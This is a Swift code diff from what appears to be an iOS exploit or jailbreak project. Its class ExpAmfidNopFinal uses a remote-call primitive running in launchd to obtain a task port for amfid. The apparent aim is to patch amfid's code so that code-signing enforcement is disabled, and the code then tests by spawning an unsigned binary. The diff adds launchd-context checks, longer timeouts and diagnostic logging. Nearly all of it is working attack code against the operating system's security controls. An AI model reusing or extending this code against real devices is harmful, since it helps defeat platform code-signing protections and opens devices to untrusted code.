@@ -171,17 +171,26 @@ final class ExpAmfidNopFinal {
     
     #if !DISABLE_REMOTECALL
     private func performPatchViaLaunchd(amfidPid: Int32) {
+        log("[4/7] task_for_pid(\(amfidPid)) from launchd...")
+        
         RootExecutor.shared.executeAsRoot(operation: "amfid_nop_final") { [self] rc in
+            // Verify we're in launchd context
+            let launchdPid = RootExecutor.rcall(rc, "getpid")
+            let launchdUid = RootExecutor.rcall(rc, "getuid")
+            
             // ─── Step 4: task_for_pid ───
             let portAddr = rc.trojanMem + 0x100
             rc[portAddr].setValue32(0)
             
+            // Use mach_task_self() in launchd's context (not our local mach_task_self_)
+            let mts = RootExecutor.rcall(rc, "mach_task_self")
+            
             let tfpRet = RootExecutor.rcall(rc, "task_for_pid",
-                UInt64(mach_task_self_), UInt64(amfidPid), portAddr)
+                mts, UInt64(amfidPid), portAddr)
             let taskPort = rc[portAddr].value32()
             
             guard tfpRet == 0 && taskPort != 0 else {
-                return (false, "[4] task_for_pid FAILED: ret=\(tfpRet) port=\(taskPort)", UInt64(tfpRet))
+                return (false, "[4] task_for_pid(\(amfidPid)) FAILED: ret=\(tfpRet) port=\(taskPort) (launchd: pid=\(launchdPid) uid=\(launchdUid) mts=0x\(String(mts, radix:16)))", UInt64(tfpRet))
             }
             
             // ─── Step 5: mach_vm_region → find __TEXT ───
@@ -270,7 +279,7 @@ final class ExpAmfidNopFinal {
         }
         
         // Poll for result and test spawn
-        DispatchQueue.main.asyncAfter(deadline: .now() + 20) { [weak self] in
+        DispatchQueue.main.asyncAfter(deadline: .now() + 35) { [weak self] in
             guard let self else { return }
             if let r = RootExecutor.shared.lastResult, r.operation == "amfid_nop_final" {
                 self.log("")
@@ -282,8 +291,22 @@ final class ExpAmfidNopFinal {
                     self.log("[TEST] Spawning unsigned binary...")
                     self.testUnsignedSpawn()
                 }
+            } else if RootExecutor.shared.isExecuting {
+                self.log("⏳ Still executing... (launchd may be slow)")
+                // Wait more
+                DispatchQueue.main.asyncAfter(deadline: .now() + 20) {
+                    if let r = RootExecutor.shared.lastResult, r.operation == "amfid_nop_final" {
+                        self.log(r.success ? "✅ \(r.message)" : "❌ \(r.message)")
+                        if r.success { self.testUnsignedSpawn() }
+                    } else {
+                        self.log("❌ Timeout (55s) — launchd connection may have failed")
+                        self.log("   Check if RC is still active (Main tab)")
+                    }
+                }
             } else {
-                self.log("⚠️ Timeout waiting for launchd result")
+                self.log("⚠️ Operation completed but no result captured")
+                self.log("   lastResult op: \(RootExecutor.shared.lastResult?.operation ?? "nil")")
+                self.log("   isExecuting: \(RootExecutor.shared.isExecuting)")
             }
         }
     }
